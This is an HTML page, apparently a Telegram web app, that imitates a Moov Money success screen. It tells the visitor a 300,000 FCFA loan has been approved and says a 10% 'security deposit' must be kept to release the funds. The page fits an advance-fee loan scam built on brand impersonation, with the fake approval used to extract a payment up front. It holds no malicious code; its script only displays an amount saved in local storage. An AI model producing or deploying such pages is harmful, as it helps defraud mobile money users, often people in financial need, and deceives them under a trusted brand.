<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Moov Money - Succès</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root { --moov-orange: #f26522; --moov-blue: #004b87; }
        body { background-color: var(--moov-blue); margin: 0; padding: 20px 15px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; font-family: sans-serif; }
        .screen-container { width: 100%; max-width: 400px; background-color: #ffffff; border-radius: 28px; padding: 30px 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); display: flex; flex-direction: column; align-items: center; }
        .check-circle { width: 80px; height: 80px; background: var(--moov-orange); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 38px; font-weight: 900; margin-bottom: 20px; }
        .amount-box { width: 100%; background: linear-gradient(180deg, var(--moov-blue) 0%, #003865 100%); border-radius: 16px; padding: 22px 15px; text-align: center; color: white; margin-bottom: 25px; }
        .home-btn { background-color: var(--moov-orange); color: white; border: none; width: 100%; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
    </style>
</head>
<body>

    <div class="screen-container">
        <div class="check-circle">✓</div>
        <h2 style="color:var(--moov-blue); margin-bottom:5px;">Félicitations !</h2>
        <p style="color:#666; font-size:14px; text-align:center; margin-bottom:20px;">Votre prêt a été approuvé avec succès.</p>

        <div class="amount-box">
            <div style="font-size:12px; font-weight:800; text-transform:uppercase; margin-bottom:8px;">Montant Approuvé</div>
            <div id="display-amount" style="font-size:30px; font-weight:900;">300 000 FCFA</div>
        </div>

        <div style="width:100%; background-color:#fef3c7; border:1px solid #fcd34d; padding:15px; border-radius:12px; margin-bottom:20px; font-size:13px; color:#92400e; line-height:1.4;">
            ⚠️ <b>Avis :</b> Votre compte Moov Money doit maintenir un dépôt de sécurité de 10% pour activer le décaissement immédiat.
        </div>

        <button class="home-btn" onclick="window.location.href='/'">🏠 Retour à l'accueil</button>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const amount = localStorage.getItem('loan_amount') || "300000";
            document.getElementById('display-amount').innerText = Number(amount).toLocaleString('fr-FR') + " FCFA";
        });
    </script>
</body>
</html>
